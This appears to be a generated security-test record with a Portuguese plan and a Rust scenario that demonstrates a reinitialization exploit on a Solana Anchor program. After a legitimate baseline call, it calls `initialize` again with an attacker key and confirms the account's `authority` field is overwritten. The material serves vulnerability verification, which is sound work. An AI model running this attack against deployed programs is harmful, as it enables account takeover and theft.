{
  "plan": "O programa `initialize` recebe uma conta `user` como `AccountInfo` generico (sem constraint `init` nem flag de inicializacao) e sobrescreve o campo `authority` com a chave do signer. O baseline chama `initialize` legitimamente com a conta `user` recem-criada (dados zerados) e o authority legitimo, provando que o cenario esta montado corretamente. O ataque reutiliza a mesma conta `user` ja inicializada (obtida de `resulting_accounts` do baseline) e chama `initialize` novamente com um authority atacante, sobrescrevendo o campo. O efeito medido e que o campo `authority` da conta `user` apos o ataque e igual a chave do atacante, diferente do authority legitimo gravado no baseline.",
  "scenario": "let legit_authority = Pubkey::new_unique();
let attacker_authority = Pubkey::new_unique();

let user_key = Pubkey::new_unique();
let user_account = account(&env.program_id, &vec![0u8; 32], None);

let ix = env.anchor_ix("initialize", &(), vec![
    AccountMeta::new(user_key, false),
    AccountMeta::new_readonly(legit_authority, true),
]);

let contas = vec![
    (user_key, user_account),
    (legit_authority, wallet(1_000_000_000)),
];

let baseline = env.baseline("initialize legitimo com authority legitimo", &ix, &contas);

let user_after_baseline = after(&baseline, &user_key).clone();

let ix_attack = env.anchor_ix("initialize", &(), vec![
    AccountMeta::new(user_key, false),
    AccountMeta::new_readonly(attacker_authority, true),
]);

let contas_attack = vec![
    (user_key, user_after_baseline),
    (attacker_authority, wallet(1_000_000_000)),
];

let r = env.attack("reinitialize sobrescrevendo authority", &ix_attack, &contas_attack);

if r.program_result == ProgramResult::Success {
    let authority_pos_ataque = read_pubkey(after(&r, &user_key).data(), 0);
    env.effect(
        "authority da conta user foi sobrescrito com a chave do atacante",
        authority_pos_ataque == attacker_authority,
    );
    env.effect(
        "authority legitimo foi substituido (estado sobrescrito)",
        authority_pos_ataque != legit_authority,
    );
}"
}

